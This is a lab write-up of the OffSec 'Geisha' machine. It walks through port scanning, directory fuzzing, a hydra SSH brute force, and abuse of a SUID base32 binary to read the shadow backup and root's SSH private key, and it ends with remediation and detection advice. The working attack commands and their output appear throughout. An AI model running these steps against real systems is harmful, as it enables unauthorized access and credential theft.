# Geisha - Web Enumeration & SUID Abuse

**Platform:** OffSec | **Target OS:** Linux | **Difficulty:** Fundamental
**Focus:** Multi-port Web Enumeration, Information Disclosure, SSH Brute-Forcing, SUID Binary Abuse (Arbitrary File Read), SSH Key Exfiltration.

## 1. Executive Summary & Attack Chain
This assessment demonstrates the critical impact of chained misconfigurations, starting from external information disclosure to local privilege escalation via binary permissions. The engagement began with extensive network reconnaissance, identifying multiple non-standard HTTP services. Aggressive directory fuzzing across these services exposed a sensitive file (`passwd.txt`) on port 8088, which leaked the system username `geisha`. 

Using the identified username, an online brute-force attack via SSH yielded valid credentials. Upon establishing a local session, local enumeration identified a critical misconfiguration: the `base32` binary possessed the SUID (Set-Owner User ID) permission bit. This OS-level flaw allowed the low-privileged user to read any file on the system as `root`. By reading and decoding the root user's private SSH key (`id_rsa`), full system administrative access was successfully achieved.

**Kill-Chain summary:**
1. **Reconnaissance:** Nmap identified multiple web servers (80, 7080, 7125, 8088, 9198).
2. **Initial Access:** Directory fuzzing (`gobuster`) discovered `passwd.txt` on port 8088. SSH brute-forcing (`hydra`) cracked the password for the user `geisha`.
3. **Local Enumeration:** Found the SUID bit improperly set on `/usr/bin/base32`.
4. **Privilege Escalation:** Abused the SUID binary to encode and decode restricted files (`shadow.bak` and `/root/.ssh/id_rsa`), eventually logging in as `root` via SSH.

---

## 2. Network Reconnaissance & Surface Mapping
The engagement commenced with a comprehensive port scan to map the target's attack surface. The host was running several web servers on non-standard ports, which necessitated a broad enumeration strategy.

```bash
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           vsftpd 3.0.3
22/tcp    open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp    open     http          Apache httpd 2.4.38 ((Debian))
7080/tcp  open     ssl/empowerid LiteSpeed
7125/tcp  open     http          nginx 1.17.10
8088/tcp  open     http          LiteSpeed httpd
9198/tcp  open     http          SimpleHTTPServer 0.6 (Python 2.7.16)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

To systematically assess the web infrastructure, `gobuster` was deployed across all accessible HTTP endpoints to identify hidden directories and files. While ports 80, 7125, and 9198 yielded standard application structures, port `8088` (LiteSpeed) revealed unique endpoints.

```bash
❯ gobuster dir -u http://192.168.152.82:8088 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 1227]
blocked              (Status: 301) [Size: 1260] [--> http://192.168.152.82:8088/blocked/]
cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.152.82:8088/cgi-bin/]
docs                 (Status: 301) [Size: 1260] [--> http://192.168.152.82:8088/docs/]
error404.html        (Status: 500) [Size: 1240]
index.html           (Status: 200) [Size: 176]
index.html           (Status: 200) [Size: 176]
info.php             (Status: 200) [Size: 2]
info.php             (Status: 200) [Size: 2]
```

Subsequent targeted fuzzing and manual inspection of the web roots revealed a highly sensitive information disclosure: a `passwd.txt` file containing a subset of the Linux `/etc/passwd` file, directly exposing valid system users.

```bash
❯ cat passwd.txt
root:x:0:0:root:/root:/bin/bash
...
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
lsadm:x:998:1001::/:/sbin/nologin
```

---

## 3. Initial Access & SSH Authentication Bruteforce
With the confirmed username `geisha`, an online dictionary attack against the SSH service (port 22) was launched using `hydra` and a targeted password list. 

*Note: Online brute-forcing is typically noisy and slow, but feasible against environments lacking lockout policies (Fail2Ban).*

```bash
❯ hydra -l geisha -P passwords.txt ssh://192.168.152.82
[DATA] attacking ssh://192.168.152.82:22/
[22][ssh] host: 192.168.152.82   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
```

The credentials `geisha` / `letmein` successfully authenticated via SSH, granting initial access to the system.

```bash
░▒▓ 💀 0xZiki   arch     ⏱ 3m9s
 󰅚 ❯ ssh geisha@192.168.152.82
geisha@192.168.152.82's password:
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64
geisha@geisha:~$ ls
local.txt
geisha@geisha:~$ cat locat.txt
cat: locat.txt: No such file or directory
geisha@geisha:~$ cat local.txt
650b8b5ff23efd0c8ee9611ef275c019
```

---

## 4. Privilege Escalation & OS Mechanics (SUID Abuse)
To escalate privileges, the system was enumerated for binaries possessing the SUID (Set-Owner User ID) bit. 

```bash
geisha@geisha:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
...
/usr/bin/sudo
/usr/bin/base32
```
The output highlighted `/usr/bin/base32`, which is highly anomalous.

### Theoretical OS Mechanics: Arbitrary File Read via SUID `base32`
In Linux, the **SUID (Set User ID)** permission bit (represented by the `s` in `-rwsr-xr-x`) instructs the operating system to execute the binary with the privileges of the *file owner* rather than the privileges of the user running it. Because `base32` is owned by `root`, executing it allows it to interact with the filesystem as the `root` user.

The `base32` utility reads files and encodes their contents into base32 format. While it does not provide interactive shell execution (like `bash` or `vim`), it enables an **Arbitrary File Read** vulnerability. By passing a restricted file (such as `/root/.ssh/id_rsa`) as an argument to the SUID `base32` binary, the OS allows the read operation. The attacker then simply pipes the base32-encoded output back into `base32 --decode` to recover the plaintext data.

Local enumeration of the `/var` filesystem exposed a `/var/backups` directory containing `.bak` copies of critical system files.

```bash
geisha@geisha:/$ cd vat
-bash: cd: vat: No such file or directory
geisha@geisha:/$ cd var
geisha@geisha:/var$ cd backups/
geisha@geisha:/var/backups$ base32 shadow.bak | base32 --decode
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
...
```

Instead of spending time cracking the root hash offline, the SUID primitive was leveraged to target the root user's SSH private key directly.

```bash
geisha@geisha:/$ base32 /root/.ssh/id_rsa | base32 --decode
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
...[Truncated]...
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----
```

The exfiltrated private key was saved locally, secured with appropriate permissions (`chmod 600`), and used to establish a seamless root SSH session.

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@192.168.242.82
root@geisha:~# cat proof.txt
32ecfe7fef4fadf1e3ab16a0e4b5032e
```

### Alternate Vector Acknowledgment
It is worth noting that due to the nature of the Arbitrary File Read primitive provided by the SUID `base32` binary, interactive root execution was not strictly necessary to capture the final objective. If the absolute path to the flag is known, it can be extracted directly from an unprivileged context:

```bash
geisha@geisha:/$ base32 /root/proof.txt | base32 --decode
32ecfe7fef4fadf1e3ab16a0e4b5032e
```

---

## 5. Defensive Remediation & Detection Engineering

### Remediation Strategies
1. **Remove Anomalous SUID Bits:** The `base32` binary does not require SUID privileges for normal system operation. Remove the SUID bit immediately using the command: `chmod u-s /usr/bin/base32`.
2. **Prevent Information Disclosure:** Ensure web roots do not contain configuration files, credential dumps (`passwd.txt`), or `.bak` files. Implement proper `.htaccess` or server-block configurations to deny access to sensitive file extensions.
3. **SSH Hardening:** Disable password-based authentication over SSH entirely (`PasswordAuthentication no` in `sshd_config`). Enforce Public Key Authentication only. 
4. **Implement Rate Limiting:** Utilize utilities like `fail2ban` or `iptables` rate-limiting to detect and block IP addresses conducting SSH brute-force or web directory fuzzing attacks.

### Detection Engineering
* **SUID Execution Monitoring:** Monitor `Event ID 4688` (Process Creation) via `auditd` where the Effective User ID (EUID) is `0` (root) but the Real User ID (RUID) belongs to a standard user (e.g., `1000`), specifically looking for binaries outside the standard SUID operational scope (like `sudo`, `su`, or `passwd`).
* **Web Fuzzing Alerts:** Monitor web access logs for sustained volumetric bursts of `404 Not Found` and `403 Forbidden` HTTP response codes originating from a single IP, which is highly indicative of directory enumeration tools like `gobuster`.
* **SSH Authentication Anomalies:** Alert on consecutive SSH authentication failures (e.g., >5 failures within 1 minute) mapped to `auth.log`.
